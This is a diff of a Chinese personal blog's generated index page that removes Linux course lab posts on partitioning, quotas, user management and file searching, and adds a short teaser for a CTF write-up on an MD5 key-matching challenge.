+                <a class="post-title-link" href="/2018/03/28/MD5之守株待兔-WP/" itemprop="url">MD5之守株待兔-WP</a></h1>
         
 
         <div class="post-meta">
@@ -1482,8 +1493,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-07T13:08:41+08:00">
-                2018-05-07
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-28T21:25:25+08:00">
+                2018-03-28
               </time>
             
 
@@ -1505,8 +1516,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学校/" itemprop="url" rel="index">
-                    <span itemprop="name">学校</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
                   </a>
                 </span>
 
@@ -1544,411 +1555,18 @@
       
         
           
-            <p><strong>实验一：添加10G硬盘，建立分区，主分区一个3G,逻辑分区2个，分别为3G和4G，并格式化</strong><br>1.添加10G硬盘</p>
-<p><img src="http://img.5am3.com/img/180909/I6l5CL6GFB.png" alt="mark"></p>
-<p>2.查看硬盘分区</p>
-<p><img src="http://img.5am3.com/img/180909/47dfjGKggB.png" alt="mark"></p>
-<p>3.创建硬盘分区</p>
-<p><img src="http://img.5am3.com/img/180909/mBclCee8hh.png" alt="mark"></p>
-<p>4.建立主分区一个，3G</p>
-<p><img src="http://img.5am3.com/img/180909/ffGmc8GK1e.png" alt="mark"></p>
-<p>5.创建逻辑分区，默认大小</p>
-<p><img src="http://img.5am3.com/img/180909/JgdE4gDahI.png" alt="mark"></p>
-<p>6.一个逻辑分区为3G<br><img src="http://img.5am3.com/img/180909/LF4jF79ljA.png" alt="mark"></p>
-<p>7.一个逻辑分区为4G（此时默认）<br><img src="http://img.5am3.com/img/180909/62LfdFJCFF.png" alt="mark"></p>
-<p>8.保存分区</p>
-<p><img src="http://img.5am3.com/img/180909/cKF0K59L3k.png" alt="mark"></p>
-<p>9.再次查看分区</p>
-<p><img src="http://img.5am3.com/img/180909/68m08CJGdE.png" alt="mark"></p>
-<p>10.格式化主分区</p>
-<p><img src="http://img.5am3.com/img/180909/6ELb50jKEL.png" alt="mark"></p>
-<p>11.逻辑分区格式化</p>
-<p><img src="http://img.5am3.com/img/180909/DA5Lee7mJ5.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/aeblgjFLca.png" alt="mark"></p>
-<p><strong>实验二：建立登录用户的磁盘配额，对文件数量和大小进行限制，文件数量和大小自定，文件数量的宽限期限制为4小时，文件大小的宽限期限制为3天，并验证</strong></p>
-<p>1.查看内核是否支持配额，并安装磁盘配额工具</p>
-<p><img src="http://img.5am3.com/img/180909/EDhD0BHGaC.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/jhG15ELL2f.png" alt="mark"></p>
-<p>2.建立目录，挂载分区<br><img src="http://img.5am3.com/img/180909/75LJia84A5.png" alt="mark">!<img src="http://img.5am3.com/img/180909/E17DK7DfAf.png" alt="mark"></p>
-<p>3.编辑/etc/fstab文件<br><img src="http://img.5am3.com/img/180909/hH1HEBFdh7.png" alt="mark"><img src="http://img.5am3.com/img/180909/Jc50DgAFDF.png" alt="mark"></p>
-<p>4.重新启动虚拟机或用下面命令让配置生效<br><img src="http://img.5am3.com/img/180909/69Gc9363cI.png" alt="mark"></p>
-<p>5.建立配额数据库<br><img src="http://img.5am3.com/img/180909/elEliJmKCf.png" alt="mark"></p>
-<p>6.对用户分配磁盘配额<img src="http://img.5am3.com/img/180909/K2GkcHa9fF.png" alt="mark"></p>
-<p>7.设置配额宽限期</p>
-<p><img src="http://img.5am3.com/img/180909/E9LlfHk7CF.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/E57DeG9LIc.png" alt="mark"></p>
-<p>8.在根目录下建立一个6.2M的交换文件，文件名为  /swapfile,并显示交换分区增加</p>
-<p><img src="http://img.5am3.com/img/180909/e5927CjF3A.png" alt="mark"></p>
-<p>9.指定/dev/sdb6 为交换分区，并显示交换分区增加3.显示机器的交换分区</p>
-<p>   <img src="http://img.5am3.com/img/180909/d7ehILLi0h.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/6eA7m4i6mi.png" alt="mark"></p>
-<p>10.显示机器的交换分区<br><img src="http://img.5am3.com/img/180909/7j2j09Hbjb.png" alt="mark"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/30/Linux_7_用户的管理/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="句末">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/blog-logo.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ch3nie's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/30/Linux_7_用户的管理/" itemprop="url">Linux_7_用户的管理</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-30T16:15:48+08:00">
-                2018-04-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学校/" itemprop="url" rel="index">
-                    <span itemprop="name">学校</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong><em>一、用户的管理</em></strong></p>
-<p><strong>1.查看/etc/passwd文件，查看当前系统下有哪些用户。查看/etc/shadow文件，这些用户的密码信息</strong><img src="http://img.5am3.com/img/180909/4k2fjaekg4.png" alt="mark"></p>
-<p><strong>2.创建一个新用户user01，设置其主目录为/home/user01</strong></p>
-<p><img src="C:\Users\CHEN\AppData\Local\Temp\1536475935858.png" alt="1536475935858"></p>
-<p><strong>3.查看/etc/passwd文件的最后一行，查看新建用户的记录信息</strong></p>
-<p><img src="http://img.5am3.com/img/180909/l8lmd50b4F.png" alt="mark"></p>
-<p><strong>4.查看/etc/shadow 文件的最后一行，查看新建用户的密码信息</strong></p>
-<p><img src="http://img.5am3.com/img/180909/k8HhebHAEA.png" alt="mark"></p>
-<p><strong>5.给用户user01设置密码</strong></p>
-<p><img src="http://img.5am3.com/img/180909/38gIBaHcBK.png" alt="mark"></p>
-<p><strong>6.再次查看/etc/shadow 文件的最后一行，看看更改后的密码</strong></p>
-<p><img src="http://img.5am3.com/img/180909/bKBhJHIhei.png" alt="mark"></p>
-<p><strong>7.使用user01用户登录系统，看能否登录成功</strong></p>
-<p><img src="http://img.5am3.com/img/180909/2j7Bg29l1K.png" alt="mark"></p>
-<p><strong>8.锁定用户user01,查看/etc/shadow 文件的显示</strong><br><img src="http://img.5am3.com/img/180909/2lDBk6cDFL.png" alt="mark"></p>
-<p><strong>9.查看/etc/shadow 文件的最后一行，看看锁定后的变化</strong></p>
-<p><img src="http://img.5am3.com/img/180909/aE5Lbl35bg.png" alt="mark"></p>
-<p><strong>10.再次使用user01用户登录系统，检验用户锁定的效果</strong></p>
-<p><img src="http://img.5am3.com/img/180909/KD4ihEd1Km.png" alt="mark"></p>
-<p><strong>11.解除对用户user01的锁定</strong></p>
-<p><img src="http://img.5am3.com/img/180909/bGD512dLh9.png" alt="mark"></p>
-<p><strong>12.更改用户user01的账户名为user02，主目录为/home/user02</strong><br><img src="http://img.5am3.com/img/180909/DaI1i9KdG4.png" alt="mark"></p>
-<p><strong>13.查看/etc/passwd 文件的最后一行，看看变化</strong></p>
-<p><img src="http://img.5am3.com/img/180909/0h4kJEkgam.png" alt="mark"></p>
-<p><strong>14.删除用户user02</strong></p>
-<p><img src="http://img.5am3.com/img/180909/Lh95F49jJF.png" alt="mark"></p>
-<p><strong><em>二、组的管理</em></strong></p>
-<p><strong>1.查看/etc/group 文件，查看当前存在哪些组，各组下有哪些用户</strong></p>
-<p><img src="http://img.5am3.com/img/180909/BDIBEH57Lk.png" alt="mark"></p>
-<p><strong>2.创建一个新组: stuff</strong></p>
-<p><img src="http://img.5am3.com/img/180909/b1lgbKDbCJ.png" alt="mark"></p>
-<p><strong>3.查看/etc/group文件的最后一行，在看新建组的信息</strong></p>
-<p><img src="http://img.5am3.com/img/180909/LDg3hC1fJ6.png" alt="mark"></p>
-<p><strong>4.创建一个新账户user02,并把他的主要组和附加组都设为stuff</strong></p>
-<p><img src="http://img.5am3.com/img/180909/3FcKAF8CJD.png" alt="mark"></p>
-<p><strong>5.查看/etc/group文件的最后一行，查看stuff组下所添加的新用户信息</strong></p>
-<p><img src="http://img.5am3.com/img/180909/K4mAg56lGk.png" alt="mark"></p>
-<p><strong>6.给组stuff设置组密码，查看/etc/gshadow</strong></p>
-<p><img src="http://img.5am3.com/img/180909/7K52FCgL9C.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/kBebbHkaIE.png" alt="mark"></p>
-<p><strong>7.在组stuff 中删除用户user02</strong><br><img src="http://img.5am3.com/img/180909/3857527A3b.png" alt="mark"></p>
-<p><strong>8.再次查看/etc/group文件的最后一行，查看stuff 组信息的变化</strong><br><img src="http://img.5am3.com/img/180909/aLiAK694Jg.png" alt="mark"></p>
-<p><strong><em>三、Su和sudo</em></strong></p>
-<p><strong>1.在组stuff下建立用户u1和u2，运用su命令在u1、u2和root之间进行切换</strong><br><img src="http://img.5am3.com/img/180909/HF0gm4gK3A.png" alt="mark"></p>
-<p><strong>2.将u1加入sudu附加组</strong></p>
-<p><img src="http://img.5am3.com/img/180909/Abf5jJfGaL.png" alt="mark"></p>
-<p><strong>3.在u1下使用sudo执行root权限，如建立新用户</strong></p>
-<p><img src="http://img.5am3.com/img/180909/JBE0HaC830.png" alt="mark"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/Linux_6_查找/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="句末">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/blog-logo.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ch3nie's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/24/Linux_6_查找/" itemprop="url">Linux_6_查找</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T15:06:44+08:00">
-                2018-04-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学校/" itemprop="url" rel="index">
-                    <span itemprop="name">学校</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>1. 查找工作目录中的普通文件、目录文件</strong></p>
-<p>查找普通文件</p>
-<p><img src="http://img.5am3.com/img/180909/LiJK7eL9IE.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/4kk70d7B5d.png" alt="mark"></p>
-<p>查找目录文件</p>
-<p><img src="http://img.5am3.com/img/180909/El3gGIIbA4.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/J93DgiABKF.png" alt="mark"></p>
-<p><strong>2. 从根目录开始，查找passwd 文件</strong></p>
-<p><img src="http://img.5am3.com/img/180909/AJ92gGHbg2.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/Bi9iLl58e6.png" alt="mark"></p>
-<p><strong>3.从根目录开始，查找扩展名是.conf 文件</strong></p>
-<p><img src="http://img.5am3.com/img/180909/h3kLc2481A.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/i6iH3efKaa.png" alt="mark"></p>
-<p><strong>4.查找工作目录中大于4k字节的文件或目录</strong></p>
-<p><img src="http://img.5am3.com/img/180909/FCklK9ECKi.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/5dl6DhJlEe.png" alt="mark"></p>
-<p><strong>5.查找工作目录中文件权限为 664的文件</strong><br><img src="http://img.5am3.com/img/180909/DJEFbdHIjk.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/hL6LBmG85B.png" alt="mark"></p>
-<p><strong>6.查找工作目录中文件权限为 775的目录</strong></p>
-<p><img src="http://img.5am3.com/img/180909/3AG9gmJ946.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/Kjl75GgB6e.png" alt="mark"></p>
-<p><strong>查找 用户名为你的名字的文件</strong><br><img src="http://img.5am3.com/img/180909/lbIcal1b3J.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/BKKg1Dklmd.png" alt="mark"></p>
-<p><strong>7.查找10天以来更改的文件</strong> <img src="http://img.5am3.com/img/180909/Cel1A7gB2B.png" alt="mark"></p>
-<p><strong>8.用正则表达式查找/etc/passwd 中，第一个字母不是a,后面是ail 内容，并加行号</strong><img src="http://img.5am3.com/img/180909/Cf8F2eD7H0.png" alt="mark"></p>
-<p><strong>9.用正则表达式查找/etc/passwd 中，包含两个o的内容，并加行号</strong><br><img src="http://img.5am3.com/img/180909/g3LIFdj3KB.png" alt="mark"></p>
-<p><strong>10.在你的用户下面，建立空文件file1、file2、file3、file4，建立目录dir1、dir2</strong><br><img src="http://img.5am3.com/img/180909/Ah0i6edJa0.png" alt="mark"></p>
-<p><strong>11.建立目录dir3，其权限为442</strong></p>
-<p><img src="http://img.5am3.com/img/180909/8kb1kigjmg.png" alt="mark"></p>
-<p><strong>12.建立file1文件的符号链接，文件名自定；建立file1文件的硬链接，文件名自定；用ls命令加参数显示索引节点号，比较硬链接和符号链接的不同</strong><br><img src="http://img.5am3.com/img/180909/06Jl0CKJhI.png" alt="mark"></p>
-<p><img src="http://img.5am3.com/img/180909/m39d0Hk2kK.png" alt="mark"></p>
-<p><strong>13.在目录下建立链接：建立源文件为file2，目标为dir1目录的符号链接，文件名自定；建立源文件为file2，目标为dir1目录的硬链接，文件名自定</strong></p>
-<p> <img src="http://img.5am3.com/img/180909/4gdfjfKb5i.png" alt="mark">   </p>
-<p><strong>14.跨目录下建立链接：建立源文件为file2，目标为/home目录的符号链接，文件名自定；建立源文件为file2，目标为/home目录的硬链接，文件名自定，是否可以</strong><br><img src="http://img.5am3.com/img/180909/DE0hkGDl7K.png" alt="mark"></p>
-
-          
+          MD5之守株待兔，你需要找到和系统锁匹配的钥匙hint：从系统锁下手，通过get方式key字段提交答案，直到您的钥匙与系统锁相等则成功。
+题目链接：http://ctf5.shiyanbar.com/misc/keys/keys.php
+点开链接可以发现有两串字符，而且系统的秘钥是一直在变化的
+题目
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/28/MD5之守株待兔-WP/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1985,10 +1603,6 @@
   </section>
 
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
 
 
           </div>
@@ -2036,7 +1650,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2058,7 +1672,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
